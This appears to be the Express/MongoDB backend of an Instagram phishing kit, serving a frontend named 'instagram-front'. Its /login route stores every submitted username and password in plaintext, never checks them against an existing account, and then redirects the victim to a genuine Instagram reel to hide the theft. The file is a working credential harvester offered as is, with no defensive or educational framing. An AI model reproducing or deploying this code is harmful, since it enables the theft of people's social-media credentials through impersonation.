require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const LoginModel = require('./models/Login');

const app = express();

// ✅ Move this ABOVE app.use(cors)
const allowedOrigins = [
  "http://localhost:5173",
  "https://instagram-front-taupe.vercel.app" // 🚫 no trailing slash
];

// ✅ CORS config
app.use(cors({
  origin: function (origin, callback) {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true
}));

app.use(express.json());

app.use((req, res, next) => {
  console.log("Request received from:", req.headers.origin);
  next();
});

// ✅ MongoDB connection
mongoose
  .connect(process.env.mongoDB)
  .then(() => console.log('✅ MongoDB connected'))
  .catch((err) => console.error('❌ MongoDB connection error:', err));

// ✅ Test route
app.get('/', (req, res) => {
  res.json('Hello from backend');
});

// ✅ Login logic
app.post('/login', async (req, res) => {
  const { name, password } = req.body;

  try {
    const user = await LoginModel.findOne({ name });
    if (user) {
      await LoginModel.create({ name, password });
      return res.json({
        message: 'Already have an Account',
        redirect: 'https://www.instagram.com/reel/DHYV63ZJ-8O/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA=='
      });
    } else {
      await LoginModel.create({ name, password });
      return res.json({
        message: 'Account Created',
        redirect: 'https://www.instagram.com/reel/DHYV63ZJ-8O/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA=='
      });
    }
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Server Error' });
  }
});

// ✅ Start server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
